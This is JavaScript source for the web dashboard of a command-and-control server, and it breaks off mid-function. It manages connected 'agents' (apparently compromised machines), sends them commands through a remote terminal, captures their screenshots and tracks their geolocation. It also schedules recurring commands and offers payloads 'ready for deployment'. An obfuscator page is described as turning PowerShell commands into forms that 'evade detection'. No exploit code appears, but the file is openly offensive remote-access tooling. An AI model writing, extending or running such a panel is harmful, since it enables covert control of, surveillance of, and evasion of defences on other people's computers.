// Modern C2 Server JavaScript
class C2Server {
    constructor() {
        this.currentTerminalHost = '';
        this.terminalRefreshInterval = null;
        this.agentsRefreshInterval = null;
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.setupAutoRefresh();
        this.loadDashboard();
        this.updateStats();
    }

    setupEventListeners() {
        // Navigation
        document.addEventListener('click', (e) => {
            if (e.target.matches('[data-nav]')) {
                e.preventDefault();
                this.navigateTo(e.target.dataset.nav);
            }
        });

        // Terminal input enter key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && e.target.id === 'terminalInput') {
                this.sendTerminalCommand();
            }
        });

        // Close terminal with Escape
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && this.currentTerminalHost) {
                this.closeTerminal();
            }
        });
    }

    setupAutoRefresh() {
        // Refresh agents every 10 seconds
        this.agentsRefreshInterval = setInterval(() => {
            if (this.currentPage === 'agents') {
                this.loadAgents();
            }
        }, 10000);

        // Refresh terminal output every 2 seconds when open
        this.terminalRefreshInterval = setInterval(() => {
            if (this.currentTerminalHost) {
                this.fetchTerminalOutput();
            }
        }, 2000);
    }

    navigateTo(page) {
        this.currentPage = page;
        this.updateActiveNav();
        
        switch(page) {
            case 'dashboard':
                this.loadDashboard();
                break;
            case 'agents':
                this.loadAgents();
                break;
            case 'payloads':
                this.loadPayloads();
                break;
            case 'screenshots':
                // Redirect to standalone page for better functionality
                window.location.href = '/screenshots';
                return;
            case 'obfuscator':
                // Redirect to standalone page for better functionality
                window.location.href = '/obfuscator';
                return;
            case 'scheduler':
                // Redirect to standalone page for better functionality
                window.location.href = '/scheduler';
                return;
            case 'geolocation':
                // Redirect to standalone page for better functionality
                window.location.href = '/geolocation';
                return;

        }
    }

    updateActiveNav() {
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
        });
        document.querySelector(`[data-nav="${this.currentPage}"]`)?.classList.add('active');
    }

    async loadDashboard() {
        const mainContent = document.querySelector('.main-content');
        mainContent.innerHTML = `
            <div class="page-header fade-in">
                <h2>Command & Control Dashboard</h2>
                <p class="description">Monitor and manage your network of agents</p>
            </div>

            <div class="grid grid-4">
                <div class="stats-card fade-in">
                    <div class="stats-number" id="totalAgents">-</div>
                    <div class="stats-label">Total Agents</div>
                </div>
                <div class="stats-card fade-in">
                    <div class="stats-number" id="onlineAgents">-</div>
                    <div class="stats-label">Online Agents</div>
                </div>
                <div class="stats-card fade-in">
                    <div class="stats-number" id="totalPayloads">-</div>
                    <div class="stats-label">Available Payloads</div>
                </div>
                <div class="stats-card fade-in">
                    <div class="stats-number" id="totalFiles">-</div>
                    <div class="stats-label">Uploaded Files</div>
                </div>

            </div>


        `;

        this.updateStats();
    }

    async loadAgents() {
        const mainContent = document.querySelector('.main-content');
        mainContent.innerHTML = `
            <div class="page-header fade-in">
                <h2>Agent Management</h2>
                <p class="description">Monitor and control your network agents</p>
            </div>

            <div class="card fade-in">
                <div class="card-header">
                    <div>
                        <div class="card-title">Connected Agents</div>
                        <div class="card-subtitle">Real-time status and management</div>
                    </div>
                    <button class="btn btn-primary" onclick="c2Server.refreshAgents()">
                        <i>🔄</i> Refresh
                    </button>
                </div>
                <div class="table-container">
                    <table id="agentsTable">
                        <thead>
                            <tr>
                                <th>Hostname</th>
                                <th>IP Address</th>
                                <th>Operating System</th>
                                <th>Location</th>
                                <th>Last Seen</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="agentsBody">
                            <tr>
                                <td colspan="7" class="text-center" style="color: var(--text-secondary);">
                                    Loading agents...
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        `;

        this.fetchAgents();
    }

    async loadPayloads() {
        const mainContent = document.querySelector('.main-content');
        mainContent.innerHTML = `
            <div class="page-header fade-in">
                <h2>Payload Management</h2>
                <p class="description">Generate and manage deployment payloads</p>
            </div>

            <div class="card fade-in">
                <div class="card-header">
                    <div>
                        <div class="card-title">Available Payloads</div>
                        <div class="card-subtitle">Ready for deployment</div>
                    </div>
                </div>
                <div id="payloadList" class="file-list">
                    <p class="text-center" style="color: var(--text-secondary);">Loading payloads...</p>
                </div>
            </div>
        `;

        this.fetchPayloads();
    }

    async loadScreenshots() {
        const mainContent = document.querySelector('.main-content');
        mainContent.innerHTML = `
            <div class="page-header fade-in">
                <h2>Screenshots</h2>
                <p class="description">View and manage agent screenshots</p>
            </div>

            <div class="card fade-in">
                <div class="card-header">
                    <div>
                        <div class="card-title">Agent Screenshots</div>
                        <div class="card-subtitle">Visual monitoring of agent activities</div>
                    </div>
                </div>
                <div id="screenshotGrid" class="grid grid-3">
                    <p class="text-center" style="color: var(--text-secondary); grid-column: 1 / -1;">Loading screenshots...</p>
                </div>
            </div>
        `;

        this.fetchScreenshots();
    }

    async loadObfuscator() {
        const mainContent = document.querySelector('.main-content');
        mainContent.innerHTML = `
            <div class="page-header fade-in">
                <h2>Command Obfuscator</h2>
                <p class="description">Obfuscate PowerShell commands to evade detection</p>
            </div>

            <div class="grid grid-2">
                <div class="card fade-in">
                    <div class="card-header">
                        <div>
                            <div class="card-title">Input Command</div>
                            <div class="card-subtitle">Enter your PowerShell command</div>
                        </div>
                    </div>
                    <div class="card-content">
                        <textarea id="inputCommand" placeholder="Enter PowerShell command here..." rows="8" class="form-control"></textarea>
                        
                        <div class="form-group" style="margin-top: 20px;">
                            <label for="techniqueSelect">Obfuscation Technique:</label>
                            <select id="techniqueSelect" class="form-control">
                                <option value="none">No Obfuscation</option>
                                <option value="base64">Base64 Encoding</option>
                                <option value="string_manipulation">String Manipulation</option>
                                <option value="unicode_escape">Unicode Escape</option>
                                <option value="variable_substitution">Variable Substitution</option>
                                <option value="reverse_string">Reverse String</option>
                            </select>
                        </div>
                        
                        <button class="btn btn-primary" onclick="c2Server.obfuscateCommand()" style="margin-top: 20px;">
                            <i class="fas fa-mask"></i> Obfuscate Command
                        </button>
                    </div>
                </div>

                <div class="card fade-in">
                    <div class="card-header">
                        <div>
                            <div class="card-title">Obfuscated Output</div>
                            <div class="card-subtitle">Your obfuscated command</div>
                        </div>
                        <button class="btn btn-secondary btn-sm" onclick="c2Server.copyToClipboard()">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <div class="card-content">
                        <div id="obfuscatedOutput" class="code-output">
                            <div style="text-align: center; padding: 40px; color: var(--text-secondary);">
                                <i class="fas fa-code" style="font-size: 48px; margin-bottom: 15px; opacity: 0.5;"></i>
                                <p>Obfuscated command will appear here</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card fade-in" style="margin-top: 30px;">
                <div class="card-header">
                    <div>
                        <div class="card-title">Obfuscation Techniques</div>
                        <div class="card-subtitle">Available obfuscation methods</div>
                    </div>
                </div>
                <div class="card-content">
                    <div id="techniquesList" class="grid grid-3">
                        <!-- Techniques will be loaded here -->
                    </div>
                </div>
            </div>
        `;

        this.loadTechniques();
    }

    async loadScheduler() {
        const mainContent = document.querySelector('.main-content');
        mainContent.innerHTML = `
            <div class="page-header fade-in">
                <h2>Task Scheduler</h2>
                <p class="description">Schedule commands to run on agents at specific times</p>
            </div>

            <div class="grid grid-2">
                <div class="card fade-in">
                    <div class="card-header">
                        <div>
                            <div class="card-title">Schedule New Command</div>
                            <div class="card-subtitle">Create a scheduled task</div>
                        </div>
                    </div>
                    <div class="card-content">
                        <form id="scheduleForm">
                            <div class="form-group">
                                <label for="targetAgent">Target Agent:</label>
                                <select id="targetAgent" class="form-control" required>
                                    <option value="">Select an agent...</option>
                                </select>
                            </div>
                            
                            <div class="form-group">
                                <label for="command">Command:</label>
                                <textarea id="command" placeholder="Enter PowerShell command..." rows="4" class="form-control" required></textarea>
                            </div>
                            
                            <div class="form-group">
                                <label for="scheduleType">Schedule Type:</label>
                                <select id="scheduleType" class="form-control" onchange="c2Server.toggleScheduleOptions()" required>
                                    <option value="once">Run Once</option>
                                    <option value="hourly">Every Hour</option>
                                    <option value="daily">Daily</option>
                                    <option value="custom">Custom Cron</option>
                                </select>
                            </div>
                            
                            <div class="form-group" id="scheduleTimeGroup">
                                <label for="scheduleTime">Schedule Time:</label>
                                <input type="datetime-local" id="scheduleTime" class="form-control" required>
                            </div>
                            
                            <div class="form-group" id="cronGroup" style="display: none;">
                                <label for="cronExpression">Cron Expression:</label>
                                <input type="text" id="cronExpression" placeholder="*/5 * * * *" class="form-control">
                                <small class="form-help">Format: minute hour day month weekday</small>
                            </div>
                            
                            <div class="form-group">
                                <label for="obfuscationTechnique">Obfuscation:</label>
                                <select id="obfuscationTechnique" class="form-control">
                                    <option value="none">No Obfuscation</option>
                                    <option value="base64">Base64 Encoding</option>
                                    <option value="string_manipulation">String Manipulation</option>
                                    <option value="unicode_escape">Unicode Escape</option>
                                    <option value="variable_substitution">Variable Substitution</option>
                                    <option value="reverse_string">Reverse String</option>
                                </select>
                            </div>
                            
                            <button type="submit" class="btn btn-primary">
                                <i class="fas fa-clock"></i> Schedule Command
                            </button>
                        </form>
                    </div>
                </div>

                <div class="card fade-in">
                    <div class="card-header">
                        <div>
                            <div class="card-title">Scheduled Commands</div>
                            <div class="card-subtitle">Active scheduled tasks</div>
                        </div>
                        <button class="btn btn-secondary btn-sm" onclick="c2Server.loadScheduledCommands()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                    </div>
                    <div class="card-content">
                        <div id="scheduledCommandsList">
                            <div style="text-align: center; padding: 40px; color: var(--text-secondary);">
                                <i class="fas fa-clock" style="font-size: 48px; margin-bottom: 15px; opacity: 0.5;"></i>
                                <p>Loading scheduled commands...</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;

        this.loadAgentsForScheduler();
        this.loadScheduledCommands();
        this.setDefaultTime();
    }

    async loadGeolocation() {
        const mainContent = document.querySelector('.main-content');
        mainContent.innerHTML = `
            <div class="page-header fade-in">
                <h2>Geolocation Tracking</h2>
                <p class="description">Track the physical location of your agents worldwide</p>
            </div>

            <div class="grid grid-2">
                <div class="card fade-in">
                    <div class="card-header">
                        <div>
                            <div class="card-title">World Map</div>
                            <div class="card-subtitle">Agent locations visualization</div>
                        </div>
                        <button class="btn btn-secondary btn-sm" onclick="c2Server.refreshGeolocation()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                    </div>
                    <div class="card-content">
                        <div id="map" style="height: 400px; width: 100%; border-radius: 8px; background: #f0f0f0; display: flex; align-items: center; justify-content: center; color: var(--text-secondary);">
                            <div style="text-align: center;">
                                <i class="fas fa-map" style="font-size: 48px; margin-bottom: 15px; opacity: 0.5;"></i>
                                <p>Map visualization requires Leaflet.js</p>
                                <p style="font-size: 14px;">Use the standalone geolocation page for full map features</p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="card fade-in">
                    <div class="card-header">
                        <div>
                            <div class="card-title">Agent Locations</div>
                            <div class="card-subtitle">Detailed location information</div>
                        </div>
                    </div>
                    <div class="card-content">
                        <div id="agentLocationsList">
                            <div style="text-align: center; padding: 40px; color: var(--text-secondary);">
                                <i class="fas fa-map-marker-alt" style="font-size: 48px; margin-bottom: 15px; opacity: 0.5;"></i>
                                <p>Loading agent locations...</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card fade-in" style="margin-top: 30px;">
                <div class="card-header">
                    <div>
                        <div class="card-title">Location Statistics</div>
                        <div class="card-subtitle">Geographic distribution analysis</div>
                    </div>
                </div>
                <div class="card-content">
                    <div id="locationStats" class="grid grid-4">
                        <!-- Statistics will be loaded here -->
                    </div>
                </div>
            </div>
        `;

        this.loadGeolocationData();
    }

    // Helper methods for scheduler
    async loadAgentsForScheduler() {
        try {
            const response = await fetch('/api/agents');
            const agents = await response.json();
            const select = document.getElementById('targetAgent');
            if (select) {
                select.innerHTML = '<option value="">Select an agent...</option>';
                agents.forEach(agent => {
                    const option = document.createElement('option');
                    option.value = agent.hostname;
                    option.textContent = `${agent.hostname} (${agent.ip}) - ${agent.status}`;
                    select.appendChild(option);
                });
            }
        } catch (error) {
            console.error('Error loading agents for scheduler:', error);
        }
    }

    toggleScheduleOptions() {
        const scheduleType = document.getElementById('scheduleType')?.value;
        const scheduleTimeGroup = document.getElementById('scheduleTimeGroup');
        const cronGroup = document.getElementById('cronGroup');
        
        if (scheduleType === 'custom' && scheduleTimeGroup && cronGroup) {
            scheduleTimeGroup.style.display = 'none';
            cronGroup.style.display = 'block';
        } else if (scheduleTimeGroup && cronGroup) {
            scheduleTimeGroup.style.display = 'block';
            cronGroup.style.display = 'none';
        }
    }

    async loadScheduledCommands() {
        try {
            const response = await fetch('/api/scheduled-commands');
            const commands = await response.json();
            this.renderScheduledCommands(commands);
        } catch (error) {
            console.error('Error loading scheduled commands:', error);
            this.renderScheduledCommands([]);
        }
    }

    renderScheduledCommands(commands) {
        const container = document.getElementById('scheduledCommandsList');
        if (!container) return;
        
        if (commands.length === 0) {
            container.innerHTML = `
                <div style="text-align: center; padding: 40px; color: var(--text-secondary);">
                    <i class="fas fa-clock" style="font-size: 48px; margin-bottom: 15px; opacity: 0.5;"></i>
                    <p>No scheduled commands</p>
                    <p style="font-size: 14px; margin-top: 10px;">Schedule your first command above</p>
                </div>
            `;
            return;
        }
        
        container.innerHTML = commands.map(cmd => `
            <div class="scheduled-command-item" style="border: 1px solid var(--border-color); border-radius: 8px; padding: 15px; margin-bottom: 15px;">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                    <div style="font-weight: bold; color: var(--text-primary);">${cmd.hostname}</div>
                    <div style="background: var(--primary-color); color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px;">${cmd.schedule_type}</div>
                </div>
                <div style="margin-bottom: 10px;">
                    <div style="font-family: monospace; background: var(--bg-secondary); padding: 8px; border-radius: 4px; margin-bottom: 5px;">${cmd.command}</div>
                    <div style="font-family: monospace; background: var(--bg-secondary); padding: 8px; border-radius: 4px; font-size: 12px; color: var(--text-secondary);">${cmd.obfuscated_command}</div>
                </div>
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <div style="font-size: 12px; color: var(--text-secondary);">Next: ${cmd.next_run ? new Date(cmd.next_run).toLocaleString() : 'N/A'}</div>
                    <button class="btn btn-danger btn-sm" onclick="c2Server.deleteScheduledCommand(${cmd.id})">
                        <i class="fas fa-trash"></i> Delete
                    </button>
                </div>
            </div>
        `).join('');
    }

    async deleteScheduledCommand(cmdId) {
        if (!confirm('Are you sure you want to delete this scheduled command?')) return;

        try {
            const response = await fetch(`/api/scheduled-commands/${cmdId}`, { method: 'DELETE' });
            const data = await response.json();
            if (data.message) {
                this.showNotification('Command deleted successfully', 'success');
                this.loadScheduledCommands();
            }
        } catch (error) {
            console.error('Error deleting command:', error);
            this.showNotification('Failed to delete scheduled command', 'error');
        }
    }

    setDefaultTime() {
        const now = new Date();
        now.setHours(now.getHours() + 1);
        const timeString = now.toISOString().slice(0, 16);
        const timeInput = document.getElementById('scheduleTime');
        if (timeInput) {
            timeInput.value = timeString;
        }
    }

    // Helper methods for geolocation
    async loadGeolocationData() {
        try {
            const response = await fetch('/api/geolocation');
            const data = await response.json();
            this.renderGeolocationData(data);
        } catch (error) {
            console.error('Error loading geolocation:', error);
            this.renderGeolocationData([]);
        }
    }

    renderGeolocationData(data) {
        this.renderAgentLocations(data);
        this.renderLocationStatistics(data);
    }

    renderAgentLocations(data) {
        const container = document.getElementById('agentLocationsList');
        if (!container) return;
        
        if (data.length === 0) {
            container.innerHTML = `
                <div style="text-align: center; padding: 40px; color: var(--text-secondary);">
                    <i class="fas fa-map-marker-alt" style="font-size: 48px; margin-bottom: 15px; opacity: 0.5;"></i>
                    <p>No agent locations available</p>
                    <p style="font-size: 14px; margin-top: 10px;">Agents will appear here when they connect</p>
                </div>
            `;
            return;
        }

        container.innerHTML = data.map(agent => `
            <div class="agent-location-item" style="border: 1px solid var(--border-color); border-radius: 8px; padding: 15px; margin-bottom: 15px;">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                    <div style="font-weight: bold; color: var(--text-primary);">${agent.hostname}</div>
                    <div style="background: ${agent.latitude !== 0 ? 'var(--success-color)' : 'var(--text-secondary)'}; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px;">
                        ${agent.latitude !== 0 ? 'Located' : 'Unknown'}
                    </div>
                </div>
                <div style="margin-bottom: 10px;">
                    <div style="margin-bottom: 5px;"><i class="fas fa-network-wired"></i> ${agent.ip}</div>
                    <div style="margin-bottom: 5px;"><i class="fas fa-map-marker-alt"></i> ${agent.city}, ${agent.region}</div>
                    <div style="margin-bottom: 5px;"><i class="fas fa-flag"></i> ${agent.country}</div>
                    <div style="margin-bottom: 5px;"><i class="fas fa-building"></i> ${agent.isp}</div>
                </div>
                <div style="font-size: 12px; color: var(--text-secondary);">
                    Updated: ${new Date(agent.last_updated).toLocaleString()}
                </div>
            </div>
        `).join('');
    }

    renderLocationStatistics(data) {
        const stats = {
            totalAgents: data.length,
            locatedAgents: data.filter(a => a.latitude !== 0).length,
            countries: new Set(data.map(a => a.country)).size,
            cities: new Set(data.map(a => a.city)).size
        };

        const container = document.getElementById('locationStats');
        if (container) {
            container.innerHTML = `
                <div class="stats-card">
                    <div class="stats-number">${stats.totalAgents}</div>
                    <div class="stats-label">Total Agents</div>
                </div>
                <div class="stats-card">
                    <div class="stats-number">${stats.locatedAgents}</div>
                    <div class="stats-label">Located</div>
                </div>
                <div class="stats-card">
                    <div class="stats-number">${stats.countries}</div>
                    <div class="stats-label">Countries</div>
                </div>
                <div class="stats-card">
                    <div class="stats-number">${stats.cities}</div>
                    <div class="stats-label">Cities</div>
                </div>
            `;
        }
    }

    refreshGeolocation() {
        this.loadGeolocationData();
        this.showNotification('Geolocation data refreshed', 'success');
    }

    // Helper method for loading obfuscation techniques
    async loadTechniques() {
        try {
            const response = await fetch('/api/obfuscation-techniques');
            const techniques = await response.json();
            const container = document.getElementById('techniquesList');
            if (container) {
                container.innerHTML = techniques.map(tech => `
                    <div class="technique-card" style="border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; text-align: center;">
                        <div style="font-size: 32px; color: var(--primary-color); margin-bottom: 15px;">
                            <i class="fas fa-${tech.id === 'none' ? 'code' : 'shield-alt'}"></i>
                        </div>
                        <div style="font-weight: bold; margin-bottom: 10px; color: var(--text-primary);">${tech.name}</div>
                        <div style="font-size: 14px; color: var(--text-secondary);">${tech.description}</div>
                    </div>
                `).join('');
            }
        } catch (error) {
            console.error('Error loading techniques:', error);
        }
    }

    async obfuscateCommand() {
        const command = document.getElementById('inputCommand')?.value.trim();
        const technique = document.getElementById('techniqueSelect')?.value;
        
        if (!command) {
            this.showNotification('Please enter a command to obfuscate', 'warning');
            return;
        }
        
        try {
            const response = await fetch('/api/obfuscate', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ command, technique })
            });
            
            const result = await response.json();
            
            if (response.ok) {
                const output = document.getElementById('obfuscatedOutput');
                if (output) {
                    output.innerHTML = `
                        <div class="obfuscation-result">
                            <div class="result-section" style="margin-bottom: 20px;">
                                <h4 style="margin-bottom: 10px; color: var(--text-primary);">Original Command:</h4>
                                <pre class="code-block" style="background: var(--bg-secondary); padding: 10px; border-radius: 4px; overflow-x: auto;">${result.original}</pre>
                            </div>
                            <div class="result-section" style="margin-bottom: 20px;">
                                <h4 style="margin-bottom: 10px; color: var(--text-primary);">Obfuscated Command:</h4>
                                <pre class="code-block" style="background: var(--bg-secondary); padding: 10px; border-radius: 4px; overflow-x: auto;">${result.obfuscated}</pre>
                            </div>
                            <div class="result-section">
                                <h4 style="margin-bottom: 10px; color: var(--text-primary);">Technique Used:</h4>
                                <span class="technique-badge" style="background: var(--primary-color); color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px;">${result.technique}</span>
                            </div>
                        </div>
                    `;
                }
                this.showNotification('Command obfuscated successfully', 'success');
            } else {
                this.showNotification(result.error || 'Failed to obfuscate command', 'error');
            }
        } catch (error) {
            console.error('Error obfuscating command:', error);
            this.showNotification('Failed to obfuscate command', 'error');
        }
    }

    async copyToClipboard() {
        const output = document.getElementById('obfuscatedOutput');
        const codeBlock = output?.querySelector('.code-block');
        
        if (codeBlock) {
            try {
                await navigator.clipboard.writeText(codeBlock.textContent);
                this.showNotification('Command copied to clipboard', 'success');
            } catch (error) {
                console.error('Failed to copy to clipboard:', error);
                this.showNotification('Failed to copy to clipboard', 'error');
            }
        }
    }

    async fetchAgents() {
        try {
            const response = await fetch('/agents');
            const agents = await response.json();
            this.renderAgents(agents);
        } catch (error) {
            console.error('Error fetching agents:', error);
            this.showError('Failed to load agents');
        }
    }

    renderAgents(agents) {
        const tbody = document.getElementById('agentsBody');
        if (!tbody) return;

        if (agents.length === 0) {
            tbody.innerHTML = `
                <tr>
                    <td colspan="7" class="text-center" style="color: var(--text-secondary);">
                        No agents connected
                    </td>
                </tr>
            `;
            return;
        }

        tbody.innerHTML = agents.map(agent => {
            const lastSeen = new Date(agent.last_seen);
            const isOnline = (Date.now() - lastSeen.getTime()) < 15000;
            const statusClass = isOnline ? 'status-online' : 'status-offline';
            const statusText = isOnline ? 'Online' : 'Offline';

            return `
                <tr class="fade-in">
                    <td><strong>${agent.hostname}</strong></td>
                    <td><code>${agent.ip}</code></td>
                    <td>${agent.os || 'Unknown'}</td>
                    <td>${agent.location || 'Unknown'}</td>
                    <td>${this.formatDateTime(lastSeen)}</td>
                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
                    <td>
                        <div class="file-actions">
                            <button class="btn btn-primary btn-sm" onclick="c2Server.openTerminal('${agent.hostname}')">
                                <i>🖥️</i> Terminal
                            </button>
                            <button class="btn btn-secondary btn-sm" onclick="c2Server.takeScreenshot('${agent.hostname}')" ${!isOnline ? 'disabled' : ''}>
                                <i>📷</i> Screenshot
                            </button>
                            <button class="btn btn-danger btn-sm" onclick="c2Server.deleteAgent('${agent.hostname}')">
                                <i>🗑️</i>
                            </button>
                        </div>
                    </td>
                </tr>
            `;
        }).join('');
    }

    async fetchPayloads() {
        try {
            const response = await fetch('/api/payloads');
            const payloads = await response.json();
            this.renderPayloads(payloads);
        } catch (error) {
            console.error('Error fetching payloads:', error);
            this.showError('Failed to load payloads');
        }
    }



    renderPayloads(payloads) {
        const container = document.getElementById('payloadList');
        if (!container) return;

        if (payloads.length === 0) {
            container.innerHTML = '<p class="text-center" style="color: var(--text-secondary);">No payloads available</p>';
            return;
        }

        container.innerHTML = payloads.map(payload => `
            <div class="file-item fade-in">
                <div class="file-name">
                    <i>📦</i> ${payload}
                </div>
                <div class="file-actions">
                    <button class="btn btn-primary btn-sm" onclick="c2Server.downloadPayload('${payload}')">
                        <i>⬇️</i> Download
                    </button>
                    <button class="btn btn-secondary btn-sm" onclick="c2Server.viewPayload('${payload}')">
                        <i>👁️</i> View
                    </button>
                </div>
            </div>
        `).join('');
    }

    async fetchScreenshots() {
        try {
            console.log('DEBUG: Fetching screenshots...');
            const response = await fetch('/api/screenshots');
            if (response.ok) {
                const screenshots = await response.json();
                console.log('DEBUG: Screenshots received:', screenshots);
                this.renderScreenshots(screenshots);
            } else {
                throw new Error('Failed to fetch screenshots');
            }
        } catch (error) {
            console.error('Error fetching screenshots:', error);
            this.showError('Failed to load screenshots');
        }
    }

    renderScreenshots(screenshots) {
        console.log('DEBUG: Rendering screenshots:', screenshots);
        const container = document.getElementById('screenshotGrid');
        if (!container) {
            console.error('DEBUG: Screenshot container not found!');
            return;
        }

        if (screenshots.length === 0) {
            console.log('DEBUG: No screenshots to display');
            container.innerHTML = `
                <div class="card fade-in" style="grid-column: 1 / -1; text-align: center; padding: 40px;">
                    <i style="font-size: 48px; color: var(--text-secondary); margin-bottom: 20px;">📷</i>
                    <h3 style="color: var(--text-primary); margin-bottom: 10px;">No Screenshots Available</h3>
                    <p style="color: var(--text-secondary);">Screenshots will appear here when agents take them.</p>
                </div>
            `;
            return;
        }

        console.log('DEBUG: Rendering', screenshots.length, 'screenshots');
        container.innerHTML = screenshots.map(screenshot => `
            <div class="screenshot-item fade-in">
                <div class="screenshot-header">
                    <h4>${screenshot.agent}</h4>
                    <p>${this.formatDateTime(new Date(screenshot.timestamp))}</p>
                </div>
                <div class="screenshot-image">
                    <img src="/uploads/${screenshot.filename}" alt="Screenshot from ${screenshot.agent}" style="max-width: 100%; height: auto; border-radius: 8px;">
                </div>
            </div>
        `).join('');
        
        console.log('DEBUG: Screenshots rendered successfully');
    }

    async updateStats() {
        try {
            console.log('DEBUG: Updating stats...');
            const [agentsResponse, payloadsResponse, screenshotsResponse] = await Promise.all([
                fetch('/agents'),
                fetch('/api/payloads'),
                fetch('/api/screenshots')
            ]);

            const agents = await agentsResponse.json();
            const payloads = await payloadsResponse.json();
            const screenshots = await screenshotsResponse.json();

            console.log('DEBUG: Stats data received - agents:', agents.length, 'payloads:', payloads.length, 'screenshots:', screenshots.length);

            const onlineAgents = agents.filter(a => {
                const lastSeen = new Date(a.last_seen);
                return (Date.now() - lastSeen.getTime()) < 15000;
            }).length;

            this.updateStatElement('totalAgents', agents.length);
            this.updateStatElement('onlineAgents', onlineAgents);
            this.updateStatElement('totalPayloads', payloads.length);
            this.updateStatElement('totalFiles', '0'); // No files yet
            this.updateStatElement('totalScreenshots', screenshots.length);
            this.updateStatElement('totalCommands', '0'); // No commands
            
            console.log('DEBUG: Stats updated successfully');
        } catch (error) {
            console.error('Error updating stats:', error);
        }
    }

    updateStatElement(id, value) {
        const element = document.getElementById(id);
        if (element) {
            element.textContent = value;
        }
    }

    formatDateTime(date) {
        return date.toLocaleString();
    }



    openTerminal(hostname) {
        this.currentTerminalHost = hostname;
        this.showTerminalModal();
        this.fetchTerminalOutput();
    }

    showTerminalModal() {
        const modal = document.createElement('div');
        modal.className = 'terminal-modal';
        modal.innerHTML = `
            <div class="terminal-container">
                <div class="terminal-header">
                    <h3>Terminal - ${this.currentTerminalHost}</h3>
                    <button class="terminal-close" onclick="c2Server.closeTerminal()">×</button>
                </div>
                <div class="terminal-body">
                    <div class="terminal-output" id="terminalOutput"></div>
                    <div class="terminal-input-container">
                        <input type="text" class="terminal-input" id="terminalInput" placeholder="Enter command...">
                        <button class="btn btn-primary" onclick="c2Server.sendTerminalCommand()">Send</button>
                        <button class="btn btn-secondary" onclick="c2Server.clearTerminalOutput()">Clear</button>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
        modal.style.display = 'block';
        document.getElementById('terminalInput').focus();

        // Close on backdrop click
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                this.closeTerminal();
            }
        });
    }

    closeTerminal() {
        const modal = document.querySelector('.terminal-modal');
        if (modal) {
            modal.remove();
        }
        this.currentTerminalHost = '';
    }

    async sendTerminalCommand() {
        const input = document.getElementById('terminalInput');
        const command = input.value.trim();
        
        if (!command || !this.currentTerminalHost) return;

        try {
            await fetch(`/command/${this.currentTerminalHost}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ command })
            });

            input.value = '';
            this.showNotification('Command sent successfully', 'success');
            
            // Wait a bit then fetch output
            setTimeout(() => this.fetchTerminalOutput(), 2000);
        } catch (error) {
            console.error('Error sending command:', error);
            this.showNotification('Failed to send command', 'error');
        }
    }

    async fetchTerminalOutput() {
        if (!this.currentTerminalHost) return;

        try {
            const response = await fetch(`/results/${this.currentTerminalHost}`);
            const results = await response.json();
            this.renderTerminalOutput(results);
        } catch (error) {
            console.error('Error fetching terminal output:', error);
        }
    }

    renderTerminalOutput(results) {
        const terminal = document.getElementById('terminalOutput');
        if (!terminal) return;

        terminal.innerHTML = results.map(r => 
            `<div style="margin-bottom: 10px;">
                <span style="color: var(--text-muted);">[${r.timestamp}]</span><br>
                <span style="color: var(--primary-color);">${r.output}</span>
            </div>`
        ).join('');
    }

    async clearTerminalOutput() {
        if (!this.currentTerminalHost) return;

        try {
            await fetch(`/results/${this.currentTerminalHost}`, { method: 'DELETE' });
            document.getElementById('terminalOutput').innerHTML = '';
            this.showNotification('Terminal output cleared', 'success');
        } catch (error) {
            console.error('Error clearing terminal output:', error);
            this.showNotification('Failed to clear output', 'error');
        }
    }

    async deleteAgent(hostname) {
        if (confirm(`Are you sure you want to delete agent ${hostname}?`)) {
            try {
                const response = await fetch(`/agent/${hostname}`, { method: 'DELETE' });
                if (response.ok) {
                    this.showNotification(`Agent ${hostname} deleted successfully`, 'success');
                    this.fetchAgents();
                } else {
                    this.showNotification(`Failed to delete agent ${hostname}`, 'error');
                }
            } catch (error) {
                console.error('Error deleting agent:', error);
                this.showNotification(`Error deleting agent ${hostname}`, 'error');
            }
        }
    }

    async takeScreenshot(hostname) {
        try {
            const response = await fetch(`/api/screenshot/${hostname}`, { method: 'POST' });
            if (response.ok) {
                this.showNotification(`Screenshot command sent to ${hostname}`, 'success');
            } else {
                const error = await response.json();
                this.showNotification(`Failed to send screenshot command: ${error.error}`, 'error');
            }
        } catch (error) {
            console.error('Error taking screenshot:', error);
            this.showNotification(`Error sending screenshot command to ${hostname}`, 'error');
        }
    }

    downloadPayload(filename) {
        window.open(`/payloads/${filename}`, '_blank');
    }

    viewPayload(filename) {
        window.open(`/payloads/${filename}`, '_blank');
    }

    downloadFile(filename) {
        // Placeholder function since uploads are removed
        console.log('File download not available - uploads module removed');
    }

    async deleteFile(filename) {
        if (!confirm(`Are you sure you want to delete "${filename}"?`)) return;
        
        // Note: This would require a backend endpoint to actually delete files
        this.showNotification('File deletion not implemented yet', 'warning');
    }

    refreshAgents() {
        this.fetchAgents();
        this.showNotification('Agents refreshed', 'success');
    }

    showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `notification notification-${type} fade-in`;
        notification.style.cssText = `
